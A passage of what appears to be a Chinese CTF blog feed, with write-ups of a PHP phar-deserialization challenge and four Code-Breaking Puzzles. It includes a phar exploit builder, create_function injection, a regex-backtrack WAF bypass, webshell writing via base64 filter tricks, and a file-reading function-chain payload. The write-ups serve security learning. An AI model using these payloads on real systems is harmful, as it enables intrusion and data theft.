keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>file.php中用了<code>file_exists()</code>函数判断读取的文件是否存在，并且源码里面告诉你flag在f1ag.php里面，所以猜测考察用Phar反序列化去读取flag。<br>简单地浏览一下所有的php代码发现只有两个读取系统文件的函数：</p><pre class=" language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>pop链分析<br>首先看到Show类中的_show方法：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221223445-8fb34c80-052d-1.png" alt="image.png"></p><p>可以看到f1ag被ban了，<code>highlight_file</code>利用不了<br>然后再看到Test类里面的file_get方法有<code>file_get_contents</code>函数，再回首file_get是在get方法里面调用的，而get方法是通过触发魔术方法<code>__get()</code>去调用的</p><pre class=" language-php"><code class="language-php"><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类中的一个不可访问属性或者是不存在的属性会调用此方法</code></pre><p>那么我们怎么去触发<code>__get</code>呢？再回到类Show中看到</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221230155-5b36346e-0531-1.png" alt="image.png"></p><p>看到这里思路就很清晰了，只要我们把Test实例化的对象存储在str的数组中，然后再去调用source属性（即Test中不存在的属性），就可以触发<code>__get()</code>了。那么我们如何触发<code>__toString()</code>呢？</p><pre class=" language-php"><code class="language-php"><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：将一个实例化对象当做一个字符串来使用时，会自动调用该方法</code></pre><p>在看到C1e4r类里面，看到<code>__destruct()</code>刚好有对字符串的输出</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221231440-23664036-0533-1.png" alt="image.png"><br>整个pop链就很清晰了，最后就是写exp了</p><h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fun1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fun2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fun3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fun3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$fun2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$fun3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$fun1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$fun2</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$fun1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>构造文件名</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span></code></pre><p>最后的payload</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//120.79.158.180:11115/file.php?file=phar://./upload/7bd59e11d401afdf6c1d291a33a940b2.jpg</span></code></pre><p>getflag：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221233125-7a6a80d4-0535-1.png" alt="image.png"></p><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="https://paper.seebug.org/680/" title="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="http://php.net/manual/en/phar.fileformat.phar.php" title="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 一些姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code-Breaking-Puzzles做题记录</title>
      <link href="/2018/12/20/Code-Breaking-Puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/12/20/Code-Breaking-Puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/3623" target="_blank" rel="noopener">https://xz.aliyun.com/t/3623</a></p></blockquote><p>传送门：<a href="https://code-breaking.com" title="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p><ol><li>function PHP函数利用技巧</li><li>pcrewaf PHP正则特性</li><li>phpmagic PHP写文件技巧</li><li>phplimit PHP代码执行限制绕过</li><li>nodechr Javascript字符串特性</li></ol><h1 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1.easy - function"></a>1.easy - function</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到<code>$action('',$arg)</code>这里有两个参数，可以想到<code>create_function</code>匿名函数代码注入。那么问题来了，知道怎么执行命令但是正则怎么绕，从这个正则很容易知道只要我们在开头或者结尾加入其他字符就可以绕过了，bp来fuzz一波，发现%5c可以绕过。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175639-b78733c6-004f-1.png" alt="image.png"><br>为什么在函数前面加一个”\”也能执行呢，这里涉及到了php的全局命名空间，<code>\create_function</code>就是调用全局的<code>create_function</code>函数</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175719-cf670570-004f-1.png" alt="image.png"><br>看一下手册中的例子就大概知道是什么意思了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215195500-4007efe6-0060-1.png" alt="image.png"></p><p>既然正则可以绕过了，那么就可以愉快的getflag了</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215175811-ee3aa3bc-004f-1.png" alt="image.png"></p><h1 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2.easy - pcrewaf"></a>2.easy - pcrewaf</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">is_php</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/&lt;\?.*[(`;?>].*/is'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$user_dir</span> <span class="token operator">=</span> <span class="token string">'data/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_php</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"bad request"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$user_dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$user_dir</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: $path"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token number">1</span></code></pre><p>之前看过Ph师傅<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="这篇文章" target="_blank" rel="noopener">这篇文章</a>，所以这题做起来会很轻松。用php中正则的最大回溯次数<code>（pcre.backtrack_limit）</code>使正则失效，从而导致<code>is_php()</code>返回false。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180103-54ff9b3e-0050-1.png" alt="image.png"></p><p>PHP中的正则回溯最大次数是100w次，只要超过这个值，正则匹配就会执行失败</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215201327-d3c742e8-0062-1.png" alt="image.png"><br>那么解题的思路就很清晰了，只要上传一个超长的字符串的文件，就可以绕过这个正则表达式了。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180121-5f9bd224-0050-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180201-775945b8-0050-1.png" alt="image.png"></p><h1 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3.easy - phpmagic"></a>3.easy - phpmagic</h1><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//代码段1：</span><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'read-source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'DATA_DIR'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/data/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$domain</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$log_name</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'-Y-m-d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//代码段2：</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$domain</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"dig -t A -q %s"</span><span class="token punctuation">,</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$domain</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token constant">ENT_HTML401</span> <span class="token operator">|</span> <span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$log_name</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$log_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$log_name</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$log_name</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>            <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>$domain那里用了<code>escapeshellarg()</code>，命令注入这条走不通。</p><p>文件内容我们可控，但是$output被<code>htmlspecialchars</code>转化为html实体，&lt;&gt;被干掉了，直接写shell不行，而且后缀限制得要死。</p><p>翻了以前的笔记：php在做路径处理的时候，会递归的删除掉路径中存在的“/.”。<a href="http://wonderkun.cc/index.html/?p=626" title="详情看这里" target="_blank" rel="noopener">详情看这里</a>，所以我们只要在后缀后面加上/. pathifo就取不到后缀名了，并且我们可以正常上传一个php文件。<br>那么后缀限制就可以绕过了，写文件我们可以用伪协议流</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180507-e69ed62c-0050-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180514-ea606424-0050-1.png" alt="image.png"><br>但是$log_name前面被加上了<code>$_SERVER['SERVER_NAME']</code>，查看了手册之后发现这个值我们是可控的</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180528-f2fd4af2-0050-1.png" alt="image.png"><br>在本地尝试了一波，发现这个值是取http响应头的host值。</p><p>最后一个问题是我们怎么控制base64的长度呢，我们知道base64编码之后一定是4的倍数，解码也是按4位4位来解的，那么我们只要控制好$output的值使得我们shell可以正常解码就可以了</p><p>还有一个trick：就是php在进行base64解码的时候如果遇到不是base64编码的字符会直接跳过</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180618-107d17ce-0051-1.png" alt="image.png"><br>发现我们是可以正常解码的。<br>然后我们再判断我们shell前面符合base64编码有多少就可以了，不够可以填充，不过刚好是符合4的倍数，无需填充</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180706-2d128720-0051-1.png" alt="image.png"><br>思路都ok了，那么我们就写shell吧<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180801-4e69462a-0051-1.png" alt=""></p><p>可以成功上传<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180825-5c5603c2-0051-1.png" alt=""><br>getflag<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215180900-7132ab38-0051-1.png" alt=""></p><h1 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4.easy - phplimit"></a>4.easy - phplimit</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里涉及到了PHP正则表达式的递归模式，不清楚什么是递归模式可以看这里 <a href="http://php.net/manual/zh/regexp.reference.recursive.php" title="http://php.net/manual/zh/regexp.reference.recursive.php" target="_blank" rel="noopener">http://php.net/manual/zh/regexp.reference.recursive.php</a>，</p><p>题目中的正则表达式中的关键点是<code>(?R)?</code>，<code>(?R)</code>的作用就是递归地替换它所在的整条正则表达式. 在每次迭代时, PHP语法分析器都会将<code>(?R)</code>替换为 <code>'/[^\W]+\((?R)?\)/'</code>。</p><p>那么上面真正表达式就一目了然了，就是传入的必须是函数，而且这个函数不能带入参数，类似于这种：func1(func2(func3()))，递归模式会一直递归匹配括号的内容下去。</p><p>正则知道怎么走了，那么现在就用PHP不带参数的函数一把梭吧，在本地用了N个函数测试，最终payload：</p><pre class=" language-php"><code class="language-php">code<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181215181715-98893016-0052-1.png" 